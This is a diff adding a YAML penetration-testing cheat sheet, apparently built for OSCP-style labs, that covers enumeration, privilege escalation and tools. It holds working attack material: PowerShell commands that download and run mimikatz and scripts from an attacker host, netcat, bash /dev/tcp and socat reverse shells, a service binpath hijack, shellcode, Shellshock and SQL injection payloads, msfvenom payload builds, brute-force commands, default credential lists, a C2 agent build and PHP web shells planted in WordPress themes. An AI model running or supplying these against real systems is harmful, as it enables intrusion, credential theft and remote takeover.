+            if the ssh config allows root login and non-root user's public key is added to root's authorized_keys
+            we can ssh as root: ssh -i id_rsa root@127.0.0.1
+        windows:
+          systeminfo
+          whoami /priv:
+            if SeImpersonatePrivilege are enabled, use juicypotato (https://github.com/ohpe/juicy-potato/releases). this will also need a reverse shell that can be created using msfvenom
+          enumerate:
+            wpc.exe
+            https://github.com/GDSSecurity/Windows-Exploit-Suggester
+            windows_privesc_check.py
+            windows-privesc-check2.exe
+            systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+            check file permissions (useful if writable by everyone): icacls filename
+            running services: wmic service where started=true get name, startname
+            stored credentials:
+            dir C:\unattend.xml
+            post/windows/gather/enum_unattend
+            post/windows/gather/credentials/gpp
+            reg query "HKCU\Software\ORL\WinVNC3\Password"
+            reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+            reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+          enumerate:
+            powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/mimikatz64.exe','c:\temp\mimikatz64.exe')"
+            powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/nc64.exe','c:\temp\nc64.exe')"
+            powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/priv-check.exe','c:\temp\priv-check.exe')"
+            powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.29.31:8000/jaws-enum.ps1','c:\temp\jaws-enum.ps1')"
+            powershell -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.29.31:8000/powerup.ps1'); Invoke-AllChecks"
+            powershell -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1'); Find-AllVulns"
+          services:
+            dll hijacking
+            unquoted paths
+            named pipes
+            registry
+            executable file
+            binPath
+            SERVICE_ALL_ACCESS:
+            accesschk.exe -cuwv "user" *
+              look for services with SERVICE_ALL_ACCESS flag set
+            sc qc <servicename>
+              get more details about the service
+              make sure service has no dependencies
+              change start type to ondemand
+              use netcat to get a reverse shell connection
+              sc config <servicename> start= "demand"
+              sc config <servicename> binpath= "C:\Users\User\Desktop\nc.exe -n <targetip> <attackerport> -e C:\WINDOWS\System32\cmd.exe"
+              sc config <servicename> obj= ".\LocalSystem" password= ""
+              net start <servicename>
+          password mining:
+            registry:
+            logs
+            .rdp files
+            memory:
+            configuration files:
+            cached SAM
+          registry:
+            autorun
+            AlwaysInstallElevated
+          scheduled tasks:
+            binary overwrite
+            missing binary
+    - description: restricted shells
+      cli: |
+        rbash:
+        bash -i
+        BASH_CMDS[poop]=/bin/bash;poop
+        lshell:
+        echo os.system("/bin/bash")
+    - description: reverse shell generator
+      cli: |
+      references:
+        - https://shellgenerator.github.io/
+        - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+    - description: shell
+      cli: |
+        http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+        reverse tcp shell from bash:
+        /bin/bash -i >& /dev/tcp/<targetip>/<attackerport> 0>&1
+        make a partially interactive terminal usable:
+        target: python -c "import pty; pty.spawn('/bin/bash')"
+        local: stty raw -echo ; fg
+        target: reset ; export SHELL=bash ; export TERM=xterm ; stty size ; stty -rows 45 -columns 90 ; stty size
+        reverse php shell on windows:
+        https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
+    - description: shellcode
+      cli: |
+        /bin/sh: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+    - description: shellshock
+      cli: |
+        look for /cgi-bin/ directory (incldue 403 code for gobuster scan)
+        check for scripts (-x sh,pl) using gobuster
+        test http header, user-agent probably
+        curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://shocker.htb/cgi-bin/user.sh
+        gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403
+        gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403 -k -x sh,pl,py
+        nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
+    - description: sqli
+      cli: |
+        manual verification:
+        ' or 1=1 -- -
+        ' || 1=1 #
+        find a row where you can place your output: http://<targetip>/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
+        get db version: http://<targetip>/inj.php?id=1 union all select 1,2,3,@@version,5
+        get current user: http://<targetip>/inj.php?id=1 union all select 1,2,3,user(),5
+        see all tables: http://<targetip>/inj.php?id=1 union all select 1,2,3,table_name,5 from information_schema.tables
+        get column names for a specified table: http://<targetip>/inj.php?id=1 union all select 1,2,3,column_name,5 from information_schema.columns where table_name='users'
+        concat user names and passwords: http://<targetip>/inj.php?id=1 union all select 1,2,3,concat(name, 0x3a , password),5 from users
+        write to a file: http://<targetip>/inj.php?id=1 union all select 1,2,3,"content",5 into outfile 'outfile'
+    - description: stegnography
+      cli: |
+        strings
+        exiftool
+        steghide
+    - description: tunneling
+      cli: |
+        connect via squid proxy @ 3128/tcp on 192.168.1.24, redirect to ssh service on localhost, run a local standalone daemon on 1234/tcp
+        proxytunnel -p <targetip>:3128 -d 127.0.0.1:22 -a 1234
+        ssh john@127.0.0.1 /bin/bash
+        vim /etc/proxychains.conf
+          http <targetip> 3128
+        proxychains nmap -sT -p22 <targetip>
+        proxychains ssh john@<targetip> /bin/bash
+  tools:
+    - description: burp
+      cli: |
+        set an upstream proxy within burp
+        burp > user options > upstream proxy > 192.168.92.146:3128
+    - description: cewl
+      cli: |
+        cewl www.megacorpone.com -m 6 -w /root/newfilelist.txt 2>/dev/null
+    - description: fcrackzip
+      cli: |
+        fcrackzip -uDp /usr/share/wordlists/rockyou.txt <file.zip>
+        unzip -o -P "password" ,file.zip>
+    - description: gobuster
+      cli: |
+        start with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt wordlist
+        search file extension:
+          gobuster -u <targetip> -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux -x txt,php
+          gobuster dir -u http://<targetip>:<targetport>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"
+        quick:
+          gobuster -u http://<targetip> -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+        full/comprehensive:
+          gobuster -s 200,204,301,302,307,403 -u http://<targetip> -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
+        ippsec:
+          gobuster -u http://<targetip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,302,307,403 -k -x txt,php,asp
+          gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403 -k -x sh,pl
+        cgi list:
+          /usr/share/seclists/Discovery/Web-Content/CGIs.txt
+    - description: hashcat
+      cli: |
+        hashcat -a 0 -m 0 d60dffed7cc0d87e1f4a11aa06ca73af /usr/share/wordlists/rockyou.txt
+    - description: hydra
+      cli: |
+        generic:
+        hydra -ufl /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <targetip>
+        ftp:
+        hydra -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.13.236 ftp
+        http:
+        hydra -l admin -P /root/ctf_wordlist.txt kioptrix3.com http-post-form "/admin.php:u=^USER^&p=^PASS^&f=login:'Enter your username and password to continue'" -V
+        with cookie: hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.92.110 -V http-get '/dir/page.php?name=^USER^&pass=^PASS^&submit=Log In:F=Incorrect:H=Cookie: insert stuff here'
+        pop3:
+        hydra -l root -P /usr/share/wordlists/rockyou.txt <targetip> pop3
+        rdp:
+        hydra -t 4 -V -l root -P /usr/share/wordlists/rockyou.txt rdp://<targetip>
+        smtp:
+        hydra -s 25 -v -V -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t 1 -w 20 -f <targetip> smtp
+        ssh:
+        hydra -l root -P /usr/share/wordlists/rockyou.txt <targetip> ssh
+        hydra -t 4 -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt <targetip> ssh
+        hydra -t 4 -L /usr/share/wordlists/rockyou.txt -p some_passsword <targetip> ssh
+        wordpress:
+        hydra -l elliot -P ./fsocity.dic <targetip> http-post-form "/wp-login.php:log=elliot&pwd=^PASS^:ERROR"
+    - description: john
+      cli: |
+        create custom wordlist:
+        john --wordlist=megacorpone-cewl --rules --stdout >megacorpone-cewl-jtr
+        crack shadow hashes:
+        unshadow passwd shadow >unshadowed ; john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed ; john --show unshadowed
+        crack md5 hashes:
+        john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 hashes
+    - description: kernel module
+      cli: |
+        rootkit:
+        https://github.com/PinkP4nther/Pinkit
+    - description: merlin c2 framework
+      cli: |
+        openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=root.kali.pwn" --days 7
+        GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.10.14.19:<attackerport>" -o merlinagentx64.exe main.go
+        go build -o merlinagent.elf main.go
+    - description: metasploit
+      cli: |
+        systemctl start postgresql
+        systemctl status postgresql
+        msfdb init
+        msfdb start
+        msfconsole -q
+        set verbose true
+        db_status
+        search <string>
+        show options
+        show advanced
+        show payloads
+        show targets
+        windows/x86/meterpreter/reverse_tcp
+        load mimiktaz
+        wdigest
+    - description: msfvenom
+      cli: |
+        linux bind tcp shellcode:
+          msfvenom -p linux/x86/shell_bind_tcp lport=4444 -f c -b "\x00\x0a\x0d\x20" --platform linux -a x86 -e x86/shikata_ga_nai
+        windows reverse tcp shellcode:
+          msfvenom -p windows/shell_reverse_tcp lhost=<targetip> lport=<attackerport> -b "\x00\x0a\x0d" -f c -a x86 --platform windows -e x86/shikata_ga_nai
+        revere tcp shellcode for client-side exploit without any encoder:
+          msfvenom -p windows/shell_reverse_tcp lhost=<targetip> lport=<attackerport> -f js_le --platform windows -a x86 -e generic/none
+        php reverse meterpreter:
+          msfvenom -p php/meterpreter/reverse_tcp LHOST=<targetip> LPORT=4<attackerport> -f raw -o shell.php
+        php reverse shell:
+          msfvenom -p php/reverse_php LHOST=<targetip> LPORT=80 -f raw -o reverse.php
+        java war reverse shell:
+          msfvenom -p java/shell_reverse_tcp LHOST=<targetip> LPORT=4<attackerport> -f war -o shell.war
+        windows javascript reverse shell:
+          msfvenom -p windows/shell_reverse_tcp LHOST=<targetip> LPORT=4<attackerport> -f js_le -e generic/none -n 18
+        windows powershell reverse shell:
+          msfvenom -p windows/shell_reverse_tcp LHOST=<targetip> LPORT=4<attackerport> -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
+        linux reverse tcp shell elf shared object file:
+          msfvenom -p linux/x86/shell_reverse_tcp -f elf-so lhost=<targetip> lport=<attackerport> -o linux-shell-reverse-tcp.so
+    - description: netcat
+      cli: |
+        bind:
+        nc -lvp <attackerport>
+        connect:
+        nc -nv <targetip> <attackerport>
+        reverse:
+        nc -e /bin/bash <targetip> <attackerport>
+    - description: ncrack
+      cli: |
+        bruteforce rdp login:
+        ncrack -vv --user administrator -P passwords.txt rdp://<targetip>
+    - description: netdiscover
+      cli: |
+        netdiscover -r 192.168.92.0/24
+    - description: nikto
+      cli: |
+        nikto -h http://<targetip>
+        nikto -h 192.168.92.146 -useproxy http://192.168.92.146:3128
+    - description: nmap
+      cli: |
+        vulners nse script:
+        https://github.com/vulnersCom/nmap-vulners
+        searchsploit-like vuln scan:
+        nmap --script vulners --script-args mincvss=5.0 <targetip>
+        ping sweep:
+        nmap -sn -oN scan.ping.nmap <targetiprange> ; cat scan.ping.nmap | grep Up | cut -d" " -f2
+        quick tcp:
+        nmap -Pn -n -sC -sV -vv -oN scan.tcp.nmap <targetip>
+        quick udp:
+        nmap -Pn -n -sU -sV -vv -oN scan.udp.nmap <targetip>
+        full/intensive tcp:
+        nmap -Pn -n -sC -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
+        full/intensive udp:
+        nmap -Pn -n -sU -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
+        smb bruteforce:
+        nmap --script=smb-brute.nse <targetip>
+        nmap -sV -p 445 --script smb-brute <targetiprange>
+    - description: openssl
+      cli: |
+        openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=root.kali.pwn" --days 7 ## create a new x509 certificate valid for 7 days
+        openssl req -new -key caca.key -out caca.csr ## create a new certificate signing request (csr)
+        openssl x509 -req -days 365 -in caca.csr -signkey caca.key -out pipi.crt ## generate new certificate
+        openssl pkcs12 -export -in pipi.crt -inkey caca.key -out pipi.p12 ## generate pkcs12 certificate
+      references:
+        - https://hipotermia.pw/htb/lacasadepapel
+    - description: searchsploit
+      cli: |
+        nmap service scan output -> searchsploit:
+        nmap -p- -sV -oX new.xml <attackerip>; searchsploit --nmap new.xml
+    - description: socat
+      cli: |
+        socat file:`tty`,raw,echo=0 tcp-listen:<attackerport>
+        socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attackerip>:<attackerport>
+    - description: sqlmap
+      cli: |
+        avoid prompts, use defaults:
+        sqlmap --batch
+        read http request from a text file (request captured from burp, useful for POST requests) and use it to start scan:
+        sqlmap -r searchform.txt --dbs --batch
+        sqlmap -r searchform.txt -D webapphacking --dump-all --batch
+        post requests:
+        sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
+        intrusive scans:
+        sqlmap --level 5 --risk 3
+        list databses:
+        sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --dbs
+        list tables within a database:
+        sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery --tables
+        dump a table:
+        sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -D gallery -T dev_accounts --dump
+        blind sql enumeration:
+        sqlmap -u "http://192.168.92.151:1337/978345210/index.php" --forms --dbs
+    - description: steghide
+      cli: |
+        steghide extract -sf file.jpg
+    - description: unicornscan
+      cli: |
+        scan all 64k ports:
+        unicornscan -vmT <targetip>:a
+        scan first 1k ports:
+        unicornscan -vmT <targetip>:p
+        scan in udp mode:
+        unicornscan -vmU <targetip>
+    - description: wfuzz
+      cli: |
+        enumerate directories:
+        wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://127.0.0.1/index.php?vuln=../FUZZ/file1.php"
+        wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://192.168.30.129:4480/FUZZ
+        wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://192.168.30.129:4488/FUZZ
+        enumerate directories and filter on response length:
+        wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ
+        bruteforce password:
+        bruteforce a single list:
+          wfuzz -w pwds.db -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
+        bruteforce multiple lists:
+          wfuzz -w pwds.db -w pins.txt -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
+        bruteforce multiple lists, but faster:
+          wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://192.168.0.74:8080/login.php
+          wfuzz -c -z file,./pin.txt -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php
+  ttps:
+    enumerate:
+      enumerate_nmap_initial:
+        description: run nmap initial scans
+        cli: |
+          sudo nmap -Pn -sC -sV -O -oN initial <attackerip>
+        references:
+          - https://medium.com/@ranakhalil101
+          - https://medium.com/@bondo.mike
+          - https://www.jibbsec.com/tags/oscplike/
+          - https://0xdf.gitlab.io/tags.html#oscp-like
+      enumerate_nmap_tcp:
+        description: run nmap full tcp scans
+        cli: |
+          nmap -Pn -sC -sV -p- --min-rate 10000 -oN tcp <attackerip>
+        references:
+          - https://medium.com/@ranakhalil101
+          - https://medium.com/@bondo.mike
+          - https://www.jibbsec.com/tags/oscplike/
+          - https://0xdf.gitlab.io/tags.html#oscp-like
+      enumerate_nmap_udp:
+        description: run nmap full udp scans
+        cli: |
+          nmap -Pn -sU -p- -oN udp <attackerip>
+        references:
+          - https://medium.com/@ranakhalil101
+          - https://medium.com/@bondo.mike
+          - https://www.jibbsec.com/tags/oscplike/
+          - https://0xdf.gitlab.io/tags.html#oscp-like
+      enumerate_app_apache:
+        description: 
+        cli: |
+          use directory traversal to checkout the config file:
+            /usr/local/etc/apache22/httpd.conf
+            /etc/apache2/sites-enabled/000-default.conf
+            useful when certain config changes block enumeration
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - 
+      enumerate_app_apache_tomcat:
+        description: 
+        cli: |
+          tomcat manager default creds:
+            tomcat:tomcat
+            admin:admin
+            admin:password
+            user:password
+            tomcat:s3cret
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - https://0xrick.github.io/hack-the-box/jerry/
+      enumerate_app_coldfusion_files:
+        description: look for available sub driectories and files on a coldfusion install
+        cli: |
+          dirb http://<targetip>:<targetport> /usr/share/dirb/wordlists/vulns/coldfusion.txt
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - https://medium.com/@_C_3PJoe/htb-retired-box-write-up-arctic-50eccccc560
+      enumerate_app_coldfusion_version:
+        description: find out the coldfusion install version
+        cli: |
+          http://<targetip>:<targetport>/CFIDE/adminapi/base.cfc?wsdl
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - http://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf (pg42)
+      enumerate_app_drupal:
+        description: 
+        cli: |
+          version:
+            http://<targetip>:<targetport>/CHANGELOG.txt
+          bruteforce:
+            ipaddr="<targetip>"; id=$(curl -s http://$ipaddr/user/ | grep "form_build_id" | cut -d"\"" -f6); hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt $site http-form-post "/?q=user/:name=^USER^&pass=^PASS^&form_id=user_login&form_build_id="$id":Sorry" -V
+          scan:
+            /opt/droopescan/droopescan scan drupal -u http://<targetip>
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - 
+      enumerate_app_mongo:
+        description: 
+        cli: |
+          mongo -p -u mark scheduler => connects to mongodb as user mark and allows interaction with db scheduler
+          use scheduler => switch db
+          db.getCollectionNames() => list all collections/tables
+          db.tasks.find({}) => show all entries from collection/table
+          db.tasks.insert({"cmd": "cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;"}) => insert a new entry within table tasks
+        ports:
+          - 27017/tcp
+          - 28017/tcp
+        references:
+          - 
+      enumerate_app_nodejs:
+        description: 
+        cli: |
+          check source and look at the js files to find interesting links/apis
+          use burp to spider and create a sitemap of the website
+          find app.js and look for db credentials (sql/mongo)
+          try ssh using db credentials
+        ports:
+          - 
+        references:
+          - 
+      enumerate_app_pfsense:
+        description: 
+        cli: |
+          default credentials: admin/pfsense
+        ports:
+          - 
+        references:
+          - 
+      enumerate_app_phpmyadmin:
+        description: 
+        cli: |
+          default credentials:
+            admin/
+            admin/admin
+            root/root
+            root/password
+            root/mysql
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - 
+      enumerate_app_powershell_history:
+        description: For certain accounts (like `sql_svc`) that are both user and service accounts, we can look at the user's PowerShell history and find interesting information.
+        cli: |
+          type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+        ports:
+          - 139/tcp
+          - 445/tcp
+        references:
+          - 
+      enumerate_app_prtg:
+        description: 
+        cli: |
+          default credentials:
+            prtgadmin/prtgadmin
+          configuration and backup files (accessed via an open ftp/smb):
+            c:\programdata\paessler\Configuration.dat
+            c:\programdata\paessler\Configuration.old
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - 
+      enumerate_app_unrealirc:
+        description: 
+        cli: |
+          msfconsole
+            use exploit/unix/irc/unreal_ircd_3281_backdoor
+            set rhost <targetip>
+            set rport <targetport>
+            exploit
+        ports:
+          - 6660/tcp
+          - 6661/tcp
+          - 6662/tcp
+          - 6663/tcp
+          - 6664/tcp
+          - 6665/tcp
+          - 6666/tcp
+          - 6667/tcp
+          - 6668/tcp
+          - 6669/tcp
+          - 7000/tcp
+        references:
+          - https://snowscan.io/htb-writeup-irked/
+      enumerate_app_webmin:
+        description: 
+        cli: |
+          view any file - even root owned, run perl cgi scripts
+          msf: auxiliary/admin/webmin/file_disclosure
+          can view /etc/ldap.secret file that might give credentials
+          can be used to run a perl cgi script (uploaded via some other means) to gain root reverse shell
+          download shadow file and try cracking hashes
+          download ssh authorized_keys for users (names obtained from shadow file), use edb:5720 and "ssh -i"
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - 
+      enumerate_app_wordpress:
+        description: 
+        cli: |
+          default creds: admin/password
+          look for phpmyadmin, plugins directories
+          look for wp-config.php file (via an open smb/ftp share) => contains db creds, useful for phpmyadmin and ssh
+          enumerate authors:
+            http://192.168.92.167:8080/?author=1 => will show username as "AUTHOR ARCHIVES: <username>"
+            http://192.168.92.167:8080/?author=2 => will not show username if author id is invalid
+            wpuser http://192.168.92.134/ usernames
+          wpscan --url http://192.168.92.134:80/ -e vp,vt,tt,cb,dbe,u,m
+          bruteforce wordpress login:
+            wpscan --url http://192.168.92.134 -P fsocity.dic.trimmed -U elliot
+            wpscan --url http://192.168.92.169/backup_wordpress/ -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -U admin,john
+            wpscan --disable-tls-checks --url https://192.168.92.165:12380/blogblog/ -P $HOME/toolbox/vulnhub/mrrobot1/pass.list -U elliot
+            hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.92.169 http-post-form "/backup_wordpress/wp-login.php:log=admin&pwd=^PASS^:ERROR"
+          wordpress to shell:
+            #1 add webshell via /wp-admin/theme-editor.php?file=404.php
+              a. "Appearance" -> "Editor"
+              b. select "404 Template" (404.php)
+              c. add php backdoor before the `<?php get_footer(); ?>` line and click "Update File"
+              d. example php backdoor: /usr/share/webshells/php/php-reverse-shell.php
+              e. run local netcat listener
+              f. visit a non-existing page: http://192.168.92.191/wordpress/?p=<attackerport>99
+            #2 add webshell @ /wp-admin/
+              a. "Appearance" -> "Editor"
+              b. select "Theme Footer" (footer.php)
+              c. add php backdoor at the end of file and click "Update File"
+              d. example php backdoor:
+                <!-- Inpired by DK's Simple PHP backdoor (http://michaeldaw.org) -->
+                <?php
+                  if(isset($_REQUEST['cmd'])){
+                    echo "<pre>";
+                    $cmd = ($_REQUEST['cmd']);
+                    exec($cmd, $results);
+                    foreach( $results as $r )
+                    {
+                            echo $r."<br/>";
+                    }
+                    echo "</pre>";
+                    die;
+                  }
+                ?>
+                /*Usage: http://domain/path?cmd=cat+/etc/passwd*/
+              e. visit http://192.168.92.169/backup_wordpress/?cmd=cat%20/etc/passwd to run commands
+              f. result will be concatenated to the end of the page
+            #3 add webshell via media file @ /wp-admin/plugin-install.php
+              a. "Upload plugin" -> "Browse"
+              b. example php backdoor:
+                <!-- Inpired by DK's Simple PHP backdoor (http://michaeldaw.org) -->
+                <?php
+                  if(isset($_REQUEST['cmd'])){
+                    echo "<pre>";
+                    $cmd = ($_REQUEST['cmd']);
+                    exec($cmd, $results);
+                    foreach( $results as $r )
+                    {
+                            echo $r."<br/>";
+                    }
+                    echo "</pre>";
+                    die;
+                  }
+                ?>
+                /*Usage: http://domain/path?cmd=cat+/etc/passwd*/
+              c. plugin install might fail, but php file will be uploaded as a media file
+              d. visit http://192.168.92.169/backup_wordpress/wp-admin/upload.php to confirm file upload
+              e. use http://192.168.92.169/backup_wordpress/wp-content/uploads/<year>/<monthid>/<filename>.php?cmd=cat%20/etc/passwd to run commands
+            #4 metasploit:
+              msf> use exploit/unix/webapp/wp_admin_shell_upload
+              msf exploit(unix/webapp/wp_admin_shell_upload) > set rhost 192.168.92.169
+              msf exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /backup-wordpress
+              msf exploit(unix/webapp/wp_admin_shell_upload) > set username john
+              msf exploit(unix/webapp/wp_admin_shell_upload) > set password enigma
+              msf exploit(unix/webapp/wp_admin_shell_upload) > exploit
+          extract hashes from wp mysql db and crack via john:
+            select concat_ws(':', user_login, user_pass) from wp_users;
+            john --wordlist=/usr/share/wordlists/rockyou.txt hashes.wp
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - 
+      enumerate_proto_distcc:
+        description: 
+        cli: |
+          msf: exploit/unix/misc/distcc_exec
+        ports:
+          - 3232/tcp
+        references:
+          - 
+      enumerate_proto_dns:
+        description: 
+        cli: |
+          reverse lookup to find all hostnames associated with an ip:
+            dig +noall +answer -x <ipaddress> @<dnsserver>
+          dns enumeration:
+            dnsenum -o outputfile -f /usr/share/dnsrecon/namelist.txt -o outputfile domain
+          bruteforce:
+            nmap -p 80 --script dns-brute.nse <domain.name>
+            python dnscan.py -d <domain.name> -w ./subdomains-10000.txt
+          zone transfer:
+            dig axfr @<dnsserver> <domain.name>
+            host -t axfr <domain.name> <dnsserver>
+            host -l <domain.name> <dnsserver>
+        ports:
+          - 53/tcp
+          - 53/udp
+        references:
+          - 
+      enumerate_proto_finger:
+        description: 
+        cli: |
+          finger username@<targetip>
+        ports:
+          - 79/tcp
+        references:
+          - 
+      enumerate_proto_ftp:
+        description: 
+        cli: |
+          high level process:
+            Version number and associated CVEs
+            Anonymous / authenticated login (with discovered creds)
+            Sensitive files that you have read access to
+            File upload
+
+          nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 <targetip>
+          nmap -sV -Pn -vv -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <targetip>
+          hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -u -f <targetip> ftp
+          ftp passive mode:
+            ftp -p 192.168.92.192
+          bruteforce ftp login:
+            use auxiliary/scanner/ftp/ftp_login
+          check if version is vulnerable and exploit is available
+          check if anonymous access is enabled
+          check if write permission within uploads directory
+          check if ftp root directory is also http root directory and upload php reverse shell
+        ports:
+          - 21/tcp
+        references:
+          - https://medium.com/@ranakhalil101/my-oscp-journey-a-review-fa779b4339d9
+      enumerate_proto_http:
+        description: 
+        cli: |
+          identify web server, technology, application
+          identify versions
+          run nikto, dirb/dirbuster, gobuster scans
+          look at robots.txt
+          look at source code
+          check for default creds, lfi/rfi, sqli, wordpress
+
+          bash /usr/share/sparta/scripts/x11screenshot.sh <targetip>
+          cewl http://<targetip>:<targetport>/ -m 6, "http,https,ssl,soap,http-proxy,http-alt" ## create wordlist by crawling webpage
+          cewl https://<targetip>:<targetport>/ -m 6, "http,https,ssl,soap,http-proxy,http-alt" ## create wordlist by crawling webpage
+          curl -i <targetip> ## check http response headers
+          gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/cgis.txt -u http://<targetip>:<targetport> -s "200,204,301,307,403,500"
+          gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/cgis.txt -u https://<targetip>:<targetport> -s "200,204,301,307,403,500"
+          gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt -u http://<targetip>:<targetport> -s "200,204,301,307,403,500"
+          gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt -u http://<targetip>:<targetport> -s "200,204,301,307,403,500"
+          gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt -u https://<targetip>:<targetport> -s "200,204,301,307,403,500"
+          nc -v -n -w1 <targetip> <targetport> ## netcat to grab banner
+          nikto -o "[OUTPUT].txt" -p <targetport> -h <targetip>
+          nmap -Pn -sV -sC -vvvvv -p<targetport> <targetip> -oA [OUTPUT]
+          w3m -dump <targetip>/robots.txt
+          wafw00f http://<targetip>:<targetport>, "http,https,ssl,soap,http-proxy,http-alt" ## check if server is behind a web app firewall
+          wafw00f https://<targetip>:<targetport>, "http,https,ssl,soap,http-proxy,http-alt" ## check if server is behind a web app firewall
+          whatweb <targetip>:<targetport> --color=never --log-brief="[OUTPUT].txt" ## identify web technology
+        ports:
+          - 80/tcp
+          - 8080/tcp
+          - 443/tcp
+        references:
+          - 
+      enumerate_proto_ldap:
+        description: 
+        cli: |
+          ldapsearch -x -s base -h <targetip> -p 389
+        ports:
+          - 389/tcp
+          - 389/udp
+          - 636/tcp
+        references:
+          - 
+      enumerate_proto_mssql:
+        description: 
+        cli: |
+          hydra -s <targetport> -C /usr/share/sparta/wordlists/mssql-default-userpass.txt -u -f <targetip> mssql
+          hydra -ufl /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt mssql://<targetip>
+          nmap --script=ms-sql-* --script-args mssql.instance-port=1433 <targetip>
